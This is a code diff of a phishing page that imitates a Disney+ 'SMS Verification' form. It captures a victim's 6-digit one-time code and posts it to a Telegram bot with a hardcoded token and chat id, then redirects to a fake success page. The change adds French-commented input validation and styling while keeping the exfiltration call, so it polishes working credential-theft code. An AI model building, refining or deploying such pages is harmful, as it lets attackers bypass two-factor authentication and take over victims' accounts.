@@ -1,4 +1,3 @@
-<!-- sms-verification.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,6 +5,27 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>SMS Verification | Disney+</title>
   <link rel="stylesheet" href="style.css"/>
+  <style>
+    /* Styles supplémentaires pour la validation OTP */
+    .error-border {
+      border: 2px solid #ff3860 !important;
+    }
+    
+    .error-message {
+      color: #ff3860;
+      font-size: 12px;
+      margin-top: -10px;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+    
+    .otp-input {
+      text-align: center;
+      letter-spacing: 8px;
+      font-family: monospace;
+      font-size: 1.2rem;
+    }
+  </style>
 </head>
 <body class="page-form">
   <main>
@@ -25,7 +45,8 @@
     </div>
 
     <form id="smsForm">
-      <input type="text" name="sms" maxlength="6" placeholder="6-digit code" required/>
+      <input type="text" name="sms" id="smsCode" maxlength="6" placeholder="6-digit code" required class="otp-input"/>
+      <div id="smsError" class="error-message"></div>
       <button type="submit">Verify</button>
     </form>
 
@@ -54,27 +75,65 @@
   </div>
 
   <script>
-    document.getElementById("smsForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      const code = this.sms.value.trim();
-      // Send code via Telegram
-      fetch(
-        `https://api.telegram.org/bot8405352750:AAGzI6w6ks8p9nRgmikeST1D6QCZ0uorNPI/sendMessage`,
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: "-4810968086",
-            text: `🔐 SMS Code: ${code}`
-          })
+    document.addEventListener('DOMContentLoaded', function() {
+      const smsInput = document.getElementById('smsCode');
+      const smsForm = document.getElementById('smsForm');
+      const smsError = document.getElementById('smsError');
+      
+      // Validation en temps réel du code OTP
+      smsInput.addEventListener('input', function() {
+        // N'autoriser que les chiffres
+        this.value = this.value.replace(/\D/g, '');
+        
+        // Valider la longueur
+        const isValid = this.value.length === 6 && /^\d+$/.test(this.value);
+        
+        // Mettre à jour le style
+        this.classList.toggle('error-border', this.value.length > 0 && !isValid);
+        
+        // Mettre à jour le message d'erreur
+        if (this.value.length > 0 && !isValid) {
+          smsError.textContent = 'Please enter a valid 6-digit code';
+        } else {
+          smsError.textContent = '';
         }
-      ).catch(console.error);
-      // Show spinner
-      document.getElementById("spinnerOverlay").style.display = "flex";
-      // Redirect after 2.5 seconds
-      setTimeout(() => {
-        window.location.href = "success.html";
-      }, 2500);
+      });
+      
+      // Validation à la soumission du formulaire
+      smsForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const code = smsInput.value.trim();
+        
+        // Validation stricte du code OTP
+        const isValid = code.length === 6 && /^\d+$/.test(code);
+        
+        if (!isValid) {
+          smsInput.classList.add('error-border');
+          smsError.textContent = 'Please enter a valid 6-digit code';
+          return;
+        }
+        
+        // Si le code est valide, procéder à l'envoi
+        document.getElementById("spinnerOverlay").style.display = "flex";
+        
+        // Envoyer le code via Telegram
+        fetch(
+          `https://api.telegram.org/bot8405352750:AAGzI6w6ks8p9nRgmikeST1D6QCZ0uorNPI/sendMessage`,
+          {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: "-4810968086",
+              text: `🔐 SMS Code: ${code}`
+            })
+          }
+        ).catch(console.error);
+        
+        // Redirection après 2.5 secondes
+        setTimeout(() => {
+          window.location.href = "success.html";
+        }, 2500);
+      });
     });
   </script>
 </body>
